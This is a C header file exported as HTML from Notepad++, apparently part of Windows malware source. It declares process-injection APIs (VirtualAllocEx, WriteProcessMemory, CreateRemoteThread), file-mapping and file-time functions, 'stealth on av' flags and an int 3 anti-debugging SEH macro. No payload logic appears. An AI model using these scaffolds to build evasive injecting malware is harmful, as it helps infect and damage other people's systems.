<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">#ifndef MAIN_HPP
#define MAIN_HPP
</span><span class="sc0">
</span><span class="sc9">#define defdata(what) void __stdcall what();
</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">FILEIO_</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc19">size</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hMap</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">hView</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">FILEIO</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc9">#define STEALTH_SIZE 1  </span><span class="sc2">//stealth on size
</span><span class="sc9">#define STEALTH_AV 2    </span><span class="sc2">//stealth on av
</span><span class="sc0">
</span><span class="sc2">//the stc jc is a hack because of bcc32 
</span><span class="sc9">#define __seh_set asm {locals __;push   ebp;call   __setupseh_uniquename;mov    esp,[esp+8];int 3;stc;jc __catchseh_uniquename;__setupseh_uniquename:push dword ptr fs:[0];mov dword ptr fs:[0],esp}
#define __seh_rem asm {__catchseh_uniquename:pop dword ptr fs:[0];pop ebp;pop ebp;}
</span><span class="sc0">
</span><span class="sc2">//*ouch* :)
</span><span class="sc9">#define LPCVOID void*
#define LPDWORD int*
#define LPVOID void*
#define HMODULE int
#define BOOL int
#define HANDLE int
#define DWORD int
#define WORD short
#define HKEY int
</span><span class="sc0">
</span><span class="sc9">#ifndef NULL
#define NULL (void *)0
#endif
</span><span class="sc0">
</span><span class="sc9">#define STDCALL __stdcall   </span><span class="sc2">//?
</span><span class="sc9">#define WINAPI __stdcall
</span><span class="sc0">

</span><span class="sc9">#define INVALID_HANDLE_VALUE 0xffffffff
</span><span class="sc0">
</span><span class="sc9">#define MAX_PATH 260
</span><span class="sc0">
</span><span class="sc9">#define ERROR_SUCCESS 0
</span><span class="sc0">
</span><span class="sc9">#define HKEY_CURRENT_USER   (HKEY)0x80000001
#define HKEY_LOCAL_MACHINE  (HKEY)0x80000002
#define KEY_QUERY_VALUE 1
</span><span class="sc0">
</span><span class="sc9">#define FILE_MAP_ALL_ACCESS 0xf001f
#define FILE_MAP_READ   4
#define FILE_MAP_WRITE  2
#define FILE_MAP_COPY   1
#define PAGE_READONLY   2
#define PAGE_READWRITE  4
#define PAGE_WRITECOPY  8
#define PAGE_EXECUTE    16
#define PAGE_EXECUTE_READ   32
#define PAGE_EXECUTE_READWRITE  64
#define PAGE_GUARD  256
#define PAGE_NOACCESS   1
#define PAGE_NOCACHE    512
#define SEC_COMMIT  134217728
#define SEC_IMAGE   16777216
#define SEC_NOCACHE 268435456
#define SEC_RESERVE 67108864
#define MEM_COMMIT  4096
#define MEM_RESERVE 8192
#define MEM_TOP_DOWN    1048576
#define PAGE_EXECUTE    16
#define PAGE_EXECUTE_READ   32
#define PAGE_EXECUTE_READWRITE  64
#define PAGE_GUARD  256
#define PAGE_NOACCESS   1
#define PAGE_NOCACHE    512
#define MEM_COMMIT  4096
#define MEM_FREE    65536
#define MEM_RESERVE 8192
#define MEM_IMAGE   16777216
#define MEM_MAPPED  262144
#define MEM_PRIVATE 131072
#define MEM_DECOMMIT    16384
#define MEM_RELEASE 32768
#define PAGE_EXECUTE_WRITECOPY  128
#define FILE_SHARE_READ 1
#define FILE_SHARE_WRITE    2
#define FILE_SHARE_DELETE 4
#define CREATE_NEW  1
#define CREATE_ALWAYS   2
#define OPEN_EXISTING   3
#define OPEN_ALWAYS 4
#define TRUNCATE_EXISTING   5
#define FILE_ATTRIBUTE_ARCHIVE  32
#define FILE_ATTRIBUTE_COMPRESSED   2048
#define FILE_ATTRIBUTE_NORMAL   128
#define FILE_ATTRIBUTE_DIRECTORY    16
#define FILE_ATTRIBUTE_HIDDEN   2
#define FILE_ATTRIBUTE_READONLY 1
#define FILE_ATTRIBUTE_SYSTEM   4
#define FILE_ATTRIBUTE_TEMPORARY    256
#define FILE_ATTRIBUTE_SPARSE_FILE 0x200
#define FILE_ATTRIBUTE_REPARSE_POINT 0x400
#define FILE_ATTRIBUTE_OFFLINE 0x1000
#define FILE_ATTRIBUTE_NOT_CONTENT_INDEXED 0x00002000
#define FILE_ATTRIBUTE_ENCRYPTED 0x4000
#define GENERIC_READ    0x80000000
#define GENERIC_WRITE   0x40000000
#define MEM_COMMIT  4096
#define MEM_DECOMMIT    16384
#define MEM_RELEASE 32768
#define PROCESS_ALL_ACCESS  0x1f0fff
#define PROCESS_CREATE_PROCESS  128
#define PROCESS_CREATE_THREAD   2
#define PROCESS_DUP_HANDLE  64
#define PROCESS_QUERY_INFORMATION   1024
#define PROCESS_SET_INFORMATION 512
#define PROCESS_TERMINATE   1
#define PROCESS_VM_OPERATION    8
#define PROCESS_VM_READ 16
#define PROCESS_VM_WRITE    32
#define WAIT_TIMEOUT    0x102
</span><span class="sc0">
</span><span class="sc9">#pragma pack(push,1)
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">_SYSTEMTIME</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">wYear</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">wMonth</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">wDayOfWeek</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">wDay</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">wHour</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">wMinute</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">wSecond</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">wMilliseconds</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">SYSTEMTIME</span><span class="sc10">,*</span><span class="sc11">LPSYSTEMTIME</span><span class="sc10">,*</span><span class="sc11">PSYSTEMTIME</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">tagFILETIME</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">dwLowDateTime</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">dwHighDateTime</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">FILETIME</span><span class="sc10">,*</span><span class="sc11">LPFILETIME</span><span class="sc10">,*</span><span class="sc11">PFILETIME</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">_WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">dwFileAttributes</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">FILETIME</span><span class="sc0"> </span><span class="sc11">ftCreationTime</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">FILETIME</span><span class="sc0"> </span><span class="sc11">ftLastAccessTime</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">FILETIME</span><span class="sc0"> </span><span class="sc11">ftLastWriteTime</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nFileSizeHigh</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nFileSizeLow</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">dwReserved0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">dwReserved1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">cFileName</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">cAlternateFileName</span><span class="sc10">[</span><span class="sc4">14</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">dummy</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc10">,*</span><span class="sc11">LPWIN32_FIND_DATA</span><span class="sc10">,*</span><span class="sc11">PWIN32_FIND_DATA</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">_MEMORY_BASIC_INFORMATION</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">BaseAddress</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">AllocationBase</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">AllocationProtect</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">RegionSize</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">State</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">Protect</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">Type</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">MEMORY_BASIC_INFORMATION</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#pragma pack(pop)
</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iGetProcAddress</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iLoadLibraryA</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iMessageBoxA</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*,</span><span class="sc16">char</span><span class="sc10">*,</span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iFindFirstFileExW</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpFileName</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fInfoLevelId</span><span class="sc10">,</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpFindFileData</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fSearchOp</span><span class="sc10">,</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpSearchFilter</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwAdditionalFlags</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iFindNextFileW</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc11">LPWIN32_FIND_DATA</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iOutputDebugStringW</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iCreateFileW</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">HANDLE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iCreateFileMappingW</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iMapViewOfFile</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iCloseHandle</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iUnmapViewOfFile</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iGetVersion</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iVirtualAlloc</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*,</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iVirtualFree</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*,</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iEnumProcesses</span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">*,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iEnumProcessModules</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc10">,</span><span class="sc11">HMODULE</span><span class="sc10">*,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">LPDWORD</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">STDCALL</span><span class="sc0"> </span><span class="sc11">iOpenProcess</span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">BOOL</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">STDCALL</span><span class="sc0"> </span><span class="sc11">iReadProcessMemory</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc10">,</span><span class="sc11">LPCVOID</span><span class="sc10">,</span><span class="sc11">LPVOID</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc11">LPDWORD</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iVirtualAllocEx</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hProcess</span><span class="sc10">,</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">lpAddress</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwSize</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">flAllocationType</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">flProtect</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iWriteProcessMemory</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hProcess</span><span class="sc10">,</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">lpBaseAddress</span><span class="sc10">,</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">lpBuffer</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">nSize</span><span class="sc10">,</span><span class="sc11">LPDWORD</span><span class="sc0"> </span><span class="sc11">lpNumberOfBytesWritten</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iCreateRemoteThread</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hProcess</span><span class="sc10">,</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpThreadAttributes</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwStackSize</span><span class="sc10">,</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpStartAddress</span><span class="sc10">,</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">lpParameter</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwCreationFlags</span><span class="sc10">,</span><span class="sc11">LPDWORD</span><span class="sc0"> </span><span class="sc11">lpThreadId</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iGetModuleHandleA</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iVirtualProtect</span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">lpAddress</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwSize</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">flNewProtect</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpflOldProtect</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iVirtualQuery</span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">lpAddress</span><span class="sc10">,</span><span class="sc11">MEMORY_BASIC_INFORMATION</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpBuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwLength</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iFindFirstFileW</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*,</span><span class="sc11">LPWIN32_FIND_DATA</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iFindClose</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iGetLastError</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iSetLastError</span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwErrCode</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iFileTimeToSystemTime</span><span class="sc10">(</span><span class="sc11">FILETIME</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">lpFileTime</span><span class="sc10">,</span><span class="sc11">SYSTEMTIME</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpSystemTime</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iSystemTimeToFileTime</span><span class="sc10">(</span><span class="sc11">SYSTEMTIME</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">lpSystemTime</span><span class="sc10">,</span><span class="sc11">FILETIME</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpFileTime</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iGetFileSize</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc11">LPDWORD</span><span class="sc0"> </span><span class="sc11">lpFileSizeHigh</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iWideCharToMultiByte</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*,</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*,</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*,</span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iCharUpperA</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iSetFilePointer</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">lDistanceToMove</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpDistanceToMoveHigh</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwMoveMethod</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__stdcall</span><span class="sc0"> </span><span class="sc11">iSetEndOfFile</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iFindFirstChangeNotificationW</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpPathName</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">bWatchSubtree</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwNotifyFilter</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iGetFileTime</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc11">FILETIME</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpCreationTime</span><span class="sc10">,</span><span class="sc11">FILETIME</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpLastAccessTime</span><span class="sc10">,</span><span class="sc11">FILETIME</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpLastWriteTime</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iSetFileTime</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc11">FILETIME</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">lpCreationTime</span><span class="sc10">,</span><span class="sc11">FILETIME</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">lpLastAccessTime</span><span class="sc10">,</span><span class="sc11">FILETIME</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">lpLastWriteTime</span><span class="sc10">);</span><span class="sc0">
